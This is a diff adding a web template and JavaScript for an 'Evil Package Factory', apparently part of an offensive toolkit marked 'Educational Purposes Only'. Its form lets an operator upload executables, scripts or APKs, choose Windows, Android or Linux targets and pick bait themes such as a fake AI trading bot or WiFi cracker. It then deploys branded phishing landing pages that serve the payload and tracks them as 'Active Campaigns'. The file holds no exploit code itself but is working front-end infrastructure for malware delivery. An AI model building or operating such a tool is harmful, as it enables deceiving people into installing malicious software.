@@ -1,0 +1,257 @@
+<!-- Developed by chadi0x (https://github.com/chadi0x) - Educational Purposes Only -->
+{% extends 'base.html' %}
+
+{% block content %}
+
+<!-- Header -->
+<div class="page-section-header">
+  <div>
+    <h2 class="mb-0">
+      <i class="fa-solid fa-virus text-danger me-2" style="font-size:0.95rem;"></i>
+      Evil Package Factory
+    </h2>
+    <p class="text-muted mb-0 mt-1" style="font-size:0.78rem;">
+      Deploy branded phishing landing pages to deliver your payload — <strong class="text-danger">chadi0x</strong>
+    </p>
+  </div>
+</div>
+
+<div class="row g-4">
+  <!-- ── Configuration Panel ─────────────────────────────────────────────── -->
+  <div class="col-md-5">
+    <div class="osint-container h-100 d-flex flex-column">
+      <div class="pf-section-label mb-3">Configuration</div>
+
+      <form id="evilForm" class="d-flex flex-column gap-4 flex-grow-1">
+
+        <!-- Payload File -->
+        <div>
+          <label class="form-label">1. Payload File</label>
+          <input type="file" id="fileInput"
+                 class="form-control"
+                 style="color:#64748b; cursor:pointer;">
+          <div class="mt-1" style="font-size:0.72rem; color:#334155;">
+            Supported: .exe · .apk · .deb · .sh · .bat
+          </div>
+        </div>
+
+        <!-- Target OS -->
+        <div>
+          <label class="form-label">2. Target OS</label>
+          <div class="d-flex gap-2">
+            <input type="radio" class="btn-check" name="os_type" id="os_win" value="windows" checked>
+            <label class="os-btn" for="os_win">
+              <i class="fa-brands fa-windows"></i> Windows
+            </label>
+
+            <input type="radio" class="btn-check" name="os_type" id="os_android" value="android">
+            <label class="os-btn" for="os_android">
+              <i class="fa-brands fa-android"></i> Android
+            </label>
+
+            <input type="radio" class="btn-check" name="os_type" id="os_linux" value="linux">
+            <label class="os-btn" for="os_linux">
+              <i class="fa-brands fa-linux"></i> Linux
+            </label>
+          </div>
+        </div>
+
+        <!-- Bait Template -->
+        <div>
+          <label class="form-label">3. Bait Template</label>
+          <select id="templateType" class="form-select">
+            <option value="trading">AI Trading Bot (Financial)</option>
+            <option value="wifi">WiFi Cracker (Utility)</option>
+            <option value="verify">Identity Verified (Social)</option>
+          </select>
+        </div>
+
+        <!-- Deploy Button -->
+        <div class="mt-auto">
+          <button type="button" onclick="deployEvil()" class="evil-deploy-btn w-100">
+            <i class="fa-solid fa-rocket me-2"></i>Deploy Package
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- ── Active Campaigns ────────────────────────────────────────────────── -->
+  <div class="col-md-7">
+    <div class="osint-container h-100">
+      <div class="d-flex justify-content-between align-items-center mb-3">
+        <div class="pf-section-label">Active Campaigns</div>
+      </div>
+
+      <!-- Deploy Success Alert -->
+      <div id="deployResult" class="alert-banner alert-success d-none mb-3">
+        <i class="fa-solid fa-circle-check me-2"></i>
+        <span>Deployment successful — live at: </span>
+        <input type="text" id="resultLink" class="deploy-link-input" readonly>
+        <button class="tbl-action-btn ms-2" onclick="copyLinkResult()" title="Copy">
+          <i class="fa-regular fa-copy"></i>
+        </button>
+      </div>
+
+      <div class="table-responsive">
+        <table class="table table-dark table-hover align-middle mb-0 small">
+          <thead>
+            <tr>
+              <th>Template</th>
+              <th>OS</th>
+              <th>Payload</th>
+              <th>Deployed</th>
+              <th class="text-end">Actions</th>
+            </tr>
+          </thead>
+          <tbody>
+            {% for p in payloads %}
+            <tr>
+              <td>
+                {% if p.template_type == 'trading' %}<span class="platform-badge">Trading</span>
+                {% elif p.template_type == 'wifi' %}<span class="platform-badge" style="background:rgba(59,130,246,0.1);color:#3b82f6;border-color:rgba(59,130,246,0.25);">WiFi</span>
+                {% elif p.template_type == 'verify' %}<span class="platform-badge" style="background:rgba(16,185,129,0.1);color:#10b981;border-color:rgba(16,185,129,0.25);">Verify</span>
+                {% endif %}
+              </td>
+              <td>
+                {% if p.os_type == 'windows' %}<i class="fa-brands fa-windows text-primary"></i>
+                {% elif p.os_type == 'android' %}<i class="fa-brands fa-android text-success"></i>
+                {% elif p.os_type == 'linux' %}<i class="fa-brands fa-linux text-warning"></i>
+                {% endif %}
+              </td>
+              <td class="text-muted text-truncate" style="max-width:140px; font-family:'Fira Code',monospace; font-size:0.72rem;">
+                {{ p.filename.split('_',1)[1] if '_' in p.filename else p.filename }}
+              </td>
+              <td class="text-muted" style="font-size:0.72rem;">{{ p.created_at.strftime('%m-%d %H:%M') }}</td>
+              <td class="text-end">
+                <div class="d-flex gap-1 justify-content-end">
+                  <a href="{{ (saved_host or request.host_url).rstrip('/') }}/offer/{{ p.id }}"
+                     target="_blank" class="tbl-action-btn" title="View Page">
+                    <i class="fa-solid fa-arrow-up-right-from-square"></i>
+                  </a>
+                  <button class="tbl-action-btn"
+                          onclick="deletePayload('{{ p.id }}')"
+                          style="color:#dc2626; border-color:rgba(220,38,38,0.25);" title="Delete">
+                    <i class="fa-solid fa-trash"></i>
+                  </button>
+                </div>
+              </td>
+            </tr>
+            {% else %}
+            <tr>
+              <td colspan="5">
+                <div class="empty-state py-5">
+                  <i class="fa-solid fa-box-archive"></i>
+                  <p>No campaigns deployed yet.</p>
+                </div>
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  function deployEvil() {
+    const fileInput = document.getElementById('fileInput');
+    if (!fileInput.files.length) { if(window.showToast) showToast('Please select a payload file!'); else alert('Select a file.'); return; }
+
+    const osType = document.querySelector('input[name="os_type"]:checked').value;
+    const tmpl   = document.getElementById('templateType').value;
+    const btn    = document.querySelector('button[onclick="deployEvil()"]');
+    const orig   = btn.innerHTML;
+    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin me-2"></i>Uploading…';
+    btn.disabled = true;
+
+    const fd = new FormData();
+    fd.append('file', fileInput.files[0]);
+    fd.append('os_type', osType);
+    fd.append('template_type', tmpl);
+
+    fetch('/evil/deploy', { method: 'POST', body: fd })
+      .then(r => r.json())
+      .then(data => {
+        btn.innerHTML = orig; btn.disabled = false;
+        if (data.status === 'success') {
+          document.getElementById('deployResult').classList.remove('d-none');
+          document.getElementById('resultLink').value = data.link;
+        } else {
+          if(window.showToast) showToast('Error: ' + data.message); else alert('Error: ' + data.message);
+        }
+      })
+      .catch(e => { btn.innerHTML = orig; btn.disabled = false; alert('Upload failed: ' + e); });
+  }
+
+  function copyLinkResult() {
+    const v = document.getElementById('resultLink').value;
+    navigator.clipboard.writeText(v).then(() => { if(window.showToast) showToast('Copied!'); });
+  }
+
+  function deletePayload(id) {
+    if (!confirm('Delete this payload campaign?')) return;
+    fetch('/api/evil/delete/' + id, { method: 'POST' })
+      .then(() => location.reload());
+  }
+</script>
+
+<style>
+.os-btn {
+  flex:1; text-align:center; cursor:pointer;
+  padding:0.45rem 0.5rem;
+  border:1px solid rgba(255,255,255,0.08);
+  border-radius:7px; font-size:0.8rem; color:#64748b;
+  background:rgba(255,255,255,0.03);
+  transition:all 150ms ease-out;
+}
+.btn-check:checked + .os-btn {
+  background:rgba(220,38,38,0.1);
+  border-color:rgba(220,38,38,0.3);
+  color:#f1f5f9; font-weight:600;
+}
+.os-btn:hover { background:rgba(255,255,255,0.06); color:#f1f5f9; }
+
+.evil-deploy-btn {
+  display:flex; align-items:center; justify-content:center;
+  padding:0.65rem 1.5rem; border-radius:8px;
+  background:#dc2626; border:1px solid #dc2626;
+  color:#fff; font-weight:700; font-size:0.88rem;
+  cursor:pointer; font-family:'Outfit',sans-serif;
+  transition:all 150ms ease-out;
+}
+.evil-deploy-btn:hover { background:#b91c1c; box-shadow:0 4px 18px rgba(220,38,38,0.3); }
+
+.deploy-link-input {
+  background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.1);
+  color:#f1f5f9; border-radius:5px; padding:3px 8px;
+  font-family:'Fira Code',monospace; font-size:0.78rem;
+  flex:1; min-width:0;
+}
+
+.platform-badge {
+  font-size:0.68rem; font-weight:700; text-transform:uppercase; letter-spacing:0.06em;
+  background:rgba(220,38,38,0.1); color:#dc2626;
+  border:1px solid rgba(220,38,38,0.2);
+  padding:2px 8px; border-radius:4px;
+}
+
+.tbl-action-btn {
+  width:28px; height:28px;
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.08);
+  border-radius:6px; color:#64748b;
+  display:inline-flex; align-items:center; justify-content:center;
+  font-size:0.72rem; cursor:pointer; text-decoration:none;
+  transition:all 150ms; font-family:inherit;
+}
+.tbl-action-btn:hover { background:rgba(255,255,255,0.09); color:#f1f5f9; }
+
+.pf-section-label {
+  font-size:0.65rem; font-weight:800; text-transform:uppercase;
+  letter-spacing:0.1em; color:#334155;
+}
+</style>
+
+{% endblock %}
